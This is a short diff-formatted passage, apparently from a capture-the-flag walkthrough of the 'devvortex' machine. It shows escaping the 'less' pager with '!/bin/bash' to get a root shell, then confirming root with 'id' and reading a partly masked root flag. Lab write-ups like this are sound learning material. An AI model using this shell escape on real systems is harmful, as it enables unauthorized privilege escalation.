@@ -1,0 +1,1 @@
+To escape from less , I’ll type !/bin/bash , and I’m dropped to a root shell: root@devvortex:/home/logan# id uid=0(root) gid=0(root) groups=0(root) And I’ll grab the root flag: root@devvortex:~# cat root.txt 79bd5241************************
